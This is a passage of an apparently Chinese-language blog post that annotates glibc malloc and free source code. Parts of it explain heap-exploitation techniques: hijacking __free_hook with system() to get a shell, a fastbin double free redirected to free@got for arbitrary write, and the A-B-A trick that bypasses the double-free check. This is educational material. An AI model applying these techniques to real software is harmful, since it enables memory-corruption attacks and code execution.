class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br><br>  <span class="hljs-comment">//从 av-&gt;top 拿到 top_chunk 的地址</span><br>      victim = av-&gt;top;<br>  <span class="hljs-comment">//判断大小</span><br>      size = chunksize (victim);<br>  <span class="hljs-comment">//如果大小符合切割要求，就按照之前的流程切割并把 chunk 返回用户</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>        &#123;<br>          remainder_size = size - nb;<br>          remainder = chunk_at_offset (victim, nb);<br>          av-&gt;top = remainder;<br>          set_head (victim, nb | PREV_INUSE |<br>                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head (remainder, remainder_size | PREV_INUSE);<br><br>          check_malloced_chunk (av, victim, nb);<br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br><br>      <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>  <span class="hljs-comment">//如果大小不满足需要，就先合并所有的 fastbin，接着执行之前的循环</span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>        &#123;<br>          malloc_consolidate (av);<br>          <span class="hljs-comment">/* restore original bin index */</span><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>            idx = smallbin_index (nb);<br>          <span class="hljs-keyword">else</span><br>            idx = largebin_index (nb);<br>        &#125;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>  <span class="hljs-comment">//调用 sysmalloc 去分配新一页内存</span><br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>          <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意程序会反复查找当前内存区域是否有合适的内存，如果实在没有才会去调用 <code>sysmalloc</code>。一次还是分配<code>0x21000</code> 的 chunk 作为新的 <code>top_chunk</code> ，原来的 <code>top_chunk</code> 将会被 <code>free</code> 。</p><p>如果我们没有改过 <code>top_chunk</code> 的 <code>size </code>，那么新的和旧的 <code>top_chunk </code>将会是物理相邻，如果 <code>free</code> 的<code>top_chunk </code>不在 <code>fast bin</code> 范围内，那就会和新的 <code>top_chunk</code> 发生合并。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><code>malloc()</code>  函数被调用时主要流程如下：</p><ol><li>检查是否设置了 <code>malloc_hook</code> ，若设置了则跳转进入 <code>malloc_hook</code>，若未设置则获取当前的分配区，进入<code>int_malloc()</code> 。</li><li>如果当前的分配区为空，则调用 <code>sysmalloc</code> 分配空间，返回指向新 <code>chunk</code> 的指针，否则进入下一步。</li><li>若用户申请的大小在 <code>fast bin</code> 的范围内，则考虑寻找对应 <code>size</code> 的 fastbin chunk ，如果这个对应 <code>size</code> 的 fastbin 中有满足的堆块就返回给用户，如果没有就进入下一步。</li><li>如果用户申请的 <code>size</code> 符合 <code>small bin</code> 的范围，则在相应大小的链表中寻找 <code>chunk</code> 。若 <code>small bin</code> 未初始化，则调用 <code>malloc_consolidate</code> 初始化分配器，然后继续下面的步骤；如果已经初始化了，就寻找对应的 <code>small bin</code> 的链表，如果该 <code>size</code>  的 <code>small bin</code> 又满足的堆块就取出返回，否则继续下面的步骤。如果申请的不在 <code>small bin</code> 的范围，那么调用 <code>malloc_consolidate</code> 函数去合并所有 fastbin 并进入下一步。</li><li>如果在上面的流程中都没有找到对应的块，会遍历 fast bins 中的 chunk，将相邻的 chunk 进行合并， 并链接到 unsorted bin 中。</li><li>如果用户申请的大小符合 <code>large bin</code> 或 <code>small bin</code> 链表为空，完成了上一步之后，就会开始遍历处理 <code>unsorted bin</code> 链表中的 chunk 。如果 <code>unsorted bin</code> 只 有一个 chunk，这个 chunk 在上次分配时被使用过，且所需分配的 chunk 大 小属于 <code>small bin</code>，同时这个 chunk 的 <code>size</code> 大于等于需要分配的大小。这种情况下就直接将该 chunk 进行切割；否则将根据 chunk 的空间大小将其放入 small  bins 或是 large bins 中，遍历完成后，转入下一步。</li><li>上面的步骤执行结束还没有找到堆块，就说明需要分配的是一块大的内存，或者 <code>small bin</code> 和 <code>unsorted bin</code> 中都找不到合适的 chunk，并且 <code>fast bin</code> 和 <code>unsorted bin</code> 中所有的 chunk 都清除干净了。程序就来时从 <code>large bins</code> 中按照 “smallest-first，best-fit” 的原则，找一个合适的 chunk，从中划分一块所需大小的 chunk，并将剩下的部分链接回到 bins 中。若操作成功，则分配结束，否则转到下一步。</li><li>根据 <code>binmap</code> 找到表示更大 <code>size</code> 的 <code>large bin</code> 链表，若其中存在空闲的 chunk ，则将 chunk 拆分之后返回符合要求的部分，并更新 <code>last_remainder</code>。如果没有合适的堆块就进入下一步去 <code>top chunk</code> 中寻找。</li><li>若<code>top_chunk</code>的大小大于用户申请的空间的大小，则将<code>top_chunk</code>拆分，返回符合用户要求的<code>chunk</code>，并更新<code>last_remainder</code> 。否则将再一次检查 <code>fast bin</code>，如果 <code>fast bin</code> 不为空，就调用 <code>malloc_consolidate()</code> 合并堆块后再次从第 4 步开始重新查找。</li><li>如果前面的步骤中都没有找到合适的 chunk ，才会调用 <code>sysmalloc()</code> 重新分配空间并处理原本的 <code>top chunk</code> 。</li></ol><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h4><p><del>一开始还以为 free 没有 malloc这么长了呢</del></p><p><code>free </code>函数也是由 <code>__libc_free</code> 函数完成 chunk 的释放的操作的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br>  <span class="hljs-comment">// 判断是否设置了 free_hook</span><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      <span class="hljs-comment">// 如果设置了就调用 free_hook</span><br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-comment">//free(NULL) 无任何意义，直接返回</span><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br>    <br>  <span class="hljs-comment">// 将用户提供的 mem 指针转换为堆块头指针</span><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-comment">// 判断 chunk 是否由 mmap 分配</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-comment">// 如果是 mmap 分配的，则首先更新 mmap 分配和收缩阈值</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      <span class="hljs-comment">// 释放空间</span><br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>  <span class="hljs-comment">// 如果不是 mmap 创建，则调用 _int_free 函数</span><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟 <code>malloc</code> 一样，函数会先读取 <code>__free_hook</code> 看看是否为空，如果不为空则直接由 <code>free_hook</code> 指向的函数代为执行 <code>free</code> ，这里也是我们经常劫持的钩子函数。</p><p> <code>free_hook</code> 劫持起来比 <code>malloc_hook</code> 困难，但是一旦劫持成功也会很方便。 <code>malloc_hook</code> 函数我们只能写 <code>one_gadget</code> ，而一旦条件苛刻那么就还得调栈啊之类的一些操作。如果劫持到了 <code>free_hook</code> 我们就可以直接写 <code>system()</code> 函数，然后 <code>free</code> 一个内容为 <code>&#39;/bin/sh&#39;</code> 的堆块就能 <code>get shell</code>。</p><h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>首先是各种各样的参数定义和错误检查。我把注释删掉了，注释的意思大概就是要检查用户是不是设置了恶意参数。</p><ul><li><code>__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)</code>：指针和size进行比较，<del>不理解但尊重</del>。也就是大概 <code>p&gt;0xfff....</code> ，主要是应该要检测被 <code>free</code> 的 <code>chunk</code> 的 <code>size</code> 不要过大。<code>size</code> 取负之后会变得很大，比如 <code>0xfff...</code> 这样的大数值通常指针不会指向这样的地址，<code>f</code> 开头的一般都是内核地址。</li><li><code>__builtin_expect (misaligned_chunk (p), 0)</code>：计算 chunk 的指针与上掩码（ <code>0x10-1</code>也就是 <code>0xf</code> ），取出后四位观察是否为 0 。如果不为 0 则说明指针错误了，就会报错。这里主要是检查对齐，指针需要指到 <code>0x10</code> 的整倍数才能被正常 <code>free</code> 。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><br>check_inuse_chunk(av, p);<br></code></pre></td></tr></table></figure><p>接下来又是在检查：</p><ul><li><code>size &lt; MINSIZE</code>：如果 <code>size</code> 还比 <code>MINSIZE</code> 要小，那肯定 <code>size</code> 错了。</li><li><code>!aligned_OK (size)</code>：<code>chunk size</code> 也要对齐，但是这个 <code>check</code> 一般不会被触发，因为再取出 <code>chunk size</code> 的时候就会把最低位与掉。</li></ul><p> 然后就是和 <code>malloc</code> 里相同的 check 来检查 <code>inuse</code> 位。</p><h5 id="fast-bin-1"><a href="#fast-bin-1" class="headerlink" title="fast bin"></a>fast bin</h5><p>接下来就是判断这个被 free 的 chunk 是不是在 fastbin 范围内了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//判断这个 chunk 的大小是不是属于 fastbin ，且其后一个 chunk 不是 topchunk</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) &#123;<br><br>    <span class="hljs-comment">//判断 size 是否小于 MINSIZE 或者是 size&gt;=system_mem</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>  mutex_lock(&amp;av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-keyword">if</span> (! have_lock)<br>  &#123;<br>    (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    locked = <span class="hljs-number">0</span>;<br>  &#125;<br>      &#125;<br></code></pre></td></tr></table></figure><p>上面的代码检查 <code>size</code> 大小，如果大小有问题就用分配器的 lock 再次做一个判断，如果判断条件还是成立的话那就说明 <code>size</code> 真的被改成了非法数值，那就报错退出。如果进来了但是没有执行报错，说明可能多线程有点问题，就释放这个 <code>arena</code> 的锁。</p><p>检查完毕就开始释放这个 chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">//清理 fastbin 中的数据</span><br>   free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>   <br><span class="hljs-comment">//初始化 fastbin</span><br>   set_fastchunks(av);<br><span class="hljs-comment">// 获取 size 对应的 fastbin 下标</span><br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>   fb = &amp;fastbin (av, idx);<br>   <br>   <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>   mchunkptr old = *fb, old2;<br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>   <span class="hljs-keyword">do</span><br>     &#123;<br>   <br>   <span class="hljs-comment">// 判断当前 fastbin 头 chunk 与要被释放的 chunk 是否相同（防止 double free）</span><br>   <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>     &#123;<br>       errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>       <span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>       <br>   <span class="hljs-comment">// 将要被释放的 chunk 放入 fastbin 头部，修改其 fd 指针指向 old</span><br>   <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>     old_idx = fastbin_index(chunksize(old));<br>   p-&gt;fd = old2 = old;<br>     &#125;<br>   <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br>   <br>   <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>     &#123;<br>   errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>   <span class="hljs-keyword">goto</span> errout;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>它首先调用了 一个 <code>free_perturb()</code> 函数，函数内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">free_perturb</span> <span class="hljs-params">(<span class="hljs-type">char</span> *p, <span class="hljs-type">size_t</span> n)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (perturb_byte))<br>    <span class="hljs-built_in">memset</span> (p, perturb_byte, n);<br>&#125;<br></code></pre></td></tr></table></figure><p>其实跟前面 <code>malloc</code> 那个函数差不多，就是看你有没有设置那个值，如果设置了就在 <code>free</code> 之前把堆块进行 <code>memset</code> 清空，但是不一样的是，<code>perturb</code> 中 <code>memset</code> 第二个参数是要根据你设置的值再异或一个 <code>0xff</code> 的。</p><p>其中有一个检查时针对 double free 的，那么如果真的 double free 了是什么样的呢？</p><p>我们 <code>free(A)</code> ，第一次 <code>free</code>  A，对应的 bin 为空，这个 chunk 链入其中，现在 <code>fast bin</code> 中多了一个 A 。接下来我们第二次 <code>free(A)</code> ，A 会再次被加入 <code>fast bin</code> 中，然后会导致产生一个自己指向自己的指针。这时 <code>fast bin</code>中的情况就是两个A，<code>A-&gt;A</code>。此时我们再申请一个和 A 一样大的 <code>chunk</code> ，A 被申请走，但是<code>fast bin</code> 链中还剩下一个 A，但是此时我们手里有一个 A ，<code>fast bin</code> 中也有一个 A 。</p><p>这样我们就可以直接编辑 A 的指针域了。比如我让它指向了 got 表中的 <code>free()</code> 函数。那么此时 <code>fast bin</code> 中的情况就是 <code>A-&gt;free@got</code> 。然后我再次申请和 A 一样大小的 <code>chunk</code> ，A 被取出来， <code>fast bin</code> 中剩下<code>free@got</code> 。那么我第三次申请就得到了在 <code>free@got</code> 那边的 <code>chunk</code> ，然后假如我偷偷修改一下 <code>free@got</code> 为 <code>system()</code> ，那就能 get shell 了。同时我们可以看到，<code>free@got</code> 这个指针是能任意编辑的，也就是说我想申请到哪都不是问题，这样就能任意地址写了。</p><p>我们也有方法来绕过 double free 检查。因为对于 double free 的检查只有这里一处，我们就可以先 <code>free(A)</code> 再 <code>free(B)</code>，再 <code>free(A)</code> ，这样就造成 double free 啦！</p><p>如果过了检测，就将这个 chunk 链在 <code>fast bin</code> 的顶部，就是一个普通的单链表的插入。因为后进先出，所以只在 <code>fast bin</code> 的一端插入删除。</p><h5 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h5><p>它一共就三个大的 <code>if-else</code> 分支条件，是不是属于 <code>large bin</code> 、是不是属于 <code>mmap</code> 分配，和其他情况，也就是 <code>unsorted bin</code> 。</p><p>如果chunk是 <code>mmap</code> 分配的话那就调用 <code>munmap_chunk()</code> 函数去 <code>free</code> 这个 chunk。这部分代码就在 <code>_int_free</code> 函数的最后，我们不去讨论这部分具体的代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> &#123;<br>    munmap_chunk (p);<br>  &#125;<br></code></pre></td></tr></table></figure><p>接下来我们就来分析 <code>unsorted bin</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>   <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>     <span class="hljs-comment">//用一个分配器的时候先加锁，用完了释放</span><br>     (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<br>     locked = <span class="hljs-number">1</span>;<br>   &#125;<br><br>   <span class="hljs-comment">// 获取 next_chunk</span><br>   nextchunk = chunk_at_offset(p, size);<br><br>   <span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">      top block.  */</span><br>   <span class="hljs-comment">// 检查当前 chunk 是否是 top chunk 头（防止 double free）</span><br>   <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>   <span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br>   <span class="hljs-comment">// 判断 next chunk 是否超过分配区</span><br>   <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>   <span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br>   <span class="hljs-comment">// 检查 next chunk 的 inuse 位，判断被释放的 chunk 是否在使用 </span><br>   <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br><br>   <span class="hljs-comment">// 判断 next chunk 的 size 是否合法</span><br>   nextsize = chunksize(nextchunk);<br>   <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br><br>   <span class="hljs-comment">// 清除要被释放的 chunk 的内容</span><br>   free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br></code></pre></td></tr></table></figure><p>上面的部分就是对堆块的各种检查，保证 free 这个堆块不会发生错误。其中 <code>nextchunk-&gt;size &lt;= 2 * SIZE_SZ</code>的检查，也就是如果下一个 chunk 的 <code>size</code> 小于 <code>MINSIZE</code> 也会报错， 因为会涉及到 chunk 的向前合并或者向后合并，因此需要对前后堆块都进行检查。</p><p>下面就是向前和向后合并堆块大小的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 